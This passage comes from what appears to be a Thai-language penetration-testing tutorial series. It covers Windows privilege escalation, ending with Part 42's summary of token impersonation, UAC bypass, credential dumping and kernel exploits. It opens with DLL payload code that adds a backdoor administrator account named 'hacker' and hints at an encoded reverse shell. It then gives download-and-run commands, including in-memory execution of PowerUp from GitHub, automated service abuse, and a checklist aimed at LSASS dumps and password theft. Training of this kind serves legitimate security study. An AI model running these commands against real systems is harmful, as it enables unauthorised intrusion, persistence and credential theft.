            system("cmd.exe /c net user hacker Password123! /add");
            system("cmd.exe /c net localgroup administrators hacker /add");
            // Or reverse shell:
            // system("cmd.exe /c powershell.exe -enc BASE64");
            break;
    }
    return TRUE;
}
"""
```

---

## Step 420: Automated Windows PrivEsc Tools

```powershell
# Windows PrivEsc Automation Reference

# ============================================================
# WinPEAS
# ============================================================

# Download and run WinPEAS
Invoke-WebRequest -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" `
    -OutFile C:\Windows\Temp\winpeas.exe
C:\Windows\Temp\winpeas.exe

# Run in quiet mode
C:\Windows\Temp\winpeas.exe quiet

# Run specific checks
C:\Windows\Temp\winpeas.exe servicesinfo
C:\Windows\Temp\winpeas.exe userinfo
C:\Windows\Temp\winpeas.exe filesinfo

# ============================================================
# PowerUp (PowerSploit)
# ============================================================

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks  # Run all checks

# Specific PowerUp checks:
Get-ServiceUnquoted  # Unquoted service paths
Get-ModifiableServiceFile  # Writable service binaries
Get-ModifiableService  # Modifiable service configs
Get-RegistryAlwaysInstallElevated  # AlwaysInstallElevated
Get-RegistryAutoLogon  # AutoLogon credentials
Get-UnattendedInstallFile  # Unattended install files
Get-WebConfig  # Web.config files with credentials
Get-ApplicationHost  # applicationHost.config credentials
Get-ModifiablePath  # Writable paths in %PATH%
Get-ModifiableRegistryAutoRun  # Writable autorun entries

# Auto exploit with PowerUp:
Invoke-ServiceAbuse -Name 'VulnerableService'

# ============================================================
# Seatbelt (C# enumeration)
# ============================================================

Seatbelt.exe -group=all  # Run all checks
Seatbelt.exe -group=system  # System-level checks
Seatbelt.exe -group=user  # User checks
Seatbelt.exe -group=misc  # Misc checks

# Specific Seatbelt checks:
Seatbelt.exe TokenPrivileges
Seatbelt.exe ProcessOwners
Seatbelt.exe Services
Seatbelt.exe ScheduledTasks
Seatbelt.exe DotNet
Seatbelt.exe DPAPI

# ============================================================
# SharpUp (C# PowerUp)
# ============================================================

SharpUp.exe audit  # Check all
SharpUp.exe FindDomainShares  # Domain shares
SharpUp.exe HijackablePaths  # Hijackable paths

# ============================================================
# Windows PrivEsc Checklist
# ============================================================

@"
=== Windows PrivEsc Checklist ===

[SYSTEM]
[] systeminfo - OS version, patches
[] wmic qfe list - Installed hotfixes
[] Vulnerable to PrintNightmare/ZeroLogon?

[USERS]
[] whoami /all - Current user and privileges
[] net user / net localgroup
[] Autologon credentials in registry?
[] SAM/SYSTEM readable?

[SERVICES]
[] Unquoted service paths
[] Writable service binaries
[] Modifiable service registry keys
[] AlwaysInstallElevated?

[FILE PERMISSIONS]
[] Writable directories in %PATH%
[] Writable autorun entries
[] DLL hijacking opportunities

[SCHEDULED TASKS]
[] SYSTEM tasks with writable executables
[] Task XML files writable?

[CREDENTIALS]
[] Windows Credential Manager
[] Registry AutoLogon
[] Unattended install files
[] Web.config files
[] SAM/NTDS.dit backup files
[] Browser saved passwords (DPAPI)

[TOKENS]
[] SeImpersonatePrivilege -> Potato attacks
[] SeDebugPrivilege -> LSASS dump
[] SeLoadDriverPrivilege -> Load vulnerable driver
[] SeTakeOwnershipPrivilege -> Own any file
"@
```

---

## สรุป Part 42

- **Step 411**: Windows PrivEsc Enumeration - systeminfo, services, registry, credentials, network
- **Step 412**: Token Impersonation - JuicyPotato, PrintSpoofer, RoguePotato, GodPotato
- **Step 413**: Registry Exploitation - AlwaysInstallElevated, writable service keys, SAM hive
- **Step 414**: Service Binary Hijacking - unquoted paths, writable binaries, sc config
- **Step 415**: DLL Hijacking - ProcMon technique, malicious DLL, PATH injection
- **Step 416**: Scheduled Task Exploitation - SYSTEM tasks, writable executables, task creation
- **Step 417**: UAC Bypass - fodhelper, eventvwr, sdclt, cmstp bypass techniques
- **Step 418**: Credential Dumping - Mimikatz, LSASS dump, DPAPI, Credential Manager
- **Step 419**: Windows Kernel Exploits - PrintNightmare, EternalBlue, CVE reference
- **Step 420**: Automated Tools - WinPEAS, PowerUp, Seatbelt, SharpUp + checklist
